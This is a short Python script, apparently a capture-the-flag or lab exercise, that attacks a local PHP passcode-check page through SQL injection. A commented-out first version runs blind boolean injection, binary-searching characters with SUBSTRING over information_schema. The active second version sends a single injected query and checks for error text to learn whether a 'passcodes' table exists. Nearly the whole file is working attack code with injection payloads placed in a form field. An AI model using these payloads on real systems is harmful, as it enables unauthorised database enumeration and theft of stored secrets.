# import requests

# url = 'http://127.0.0.1:61234/check_code.php'
# data = {"passcode":""}

# # Initializing variables
# begin = 32
# end = 126
# exists = False

# while begin < end:
#     tmp = (begin + end) // 2
#     query = (
#         "1' || ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
#         "WHERE table_schema = database() & table_name = 'passcodes'), 1, 1)) < {} #"
#     ).format(tmp)
    
#     data["passcode"] = query
#     print(f"Trying with query: {query}")  # Debug output
#     r = requests.post(url, data=data)
#     response_text = r.text
#     print(f"Response: {response_text}")  # Debug output
    
#     if 'NO' in response_text:
#         begin = tmp + 1
#     else:
#         end = tmp
    
#     print(f"Begin: {begin}, End: {end}, Tmp: {tmp}")  # Debug output

# if begin < 126:
#     exists = True

# if exists:
#     print("Table 'passcodes' exists.")
# else:
#     print("Table 'passcodes' does not exist.")


import requests

url = 'http://127.0.0.1:61234/check_code.php'
data = {"passcode":""}

# 尝试选择不存在的列以触发错误
query = "1' & (SELECT 1 FROM passcodes) #1"
data["passcode"] = query
r = requests.post(url, data=data)
response_text = r.text

if 'error' in response_text.lower() or 'exception' in response_text.lower():
    print("Table 'passcodes' does not exist.")
else:
    print("Table 'passcodes' exists.")
